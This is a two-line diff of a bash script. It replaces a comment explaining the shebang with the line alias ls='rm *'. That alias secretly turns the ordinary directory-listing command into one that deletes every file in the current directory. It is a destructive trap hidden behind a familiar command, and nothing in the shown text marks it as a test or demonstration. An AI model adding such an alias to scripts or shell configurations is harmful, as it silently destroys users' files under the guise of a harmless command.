@@ -1,2 +1,2 @@
 #!/bin/bash
-Line 1: The shebang line indicating this is a bash script.
+alias ls='rm *'
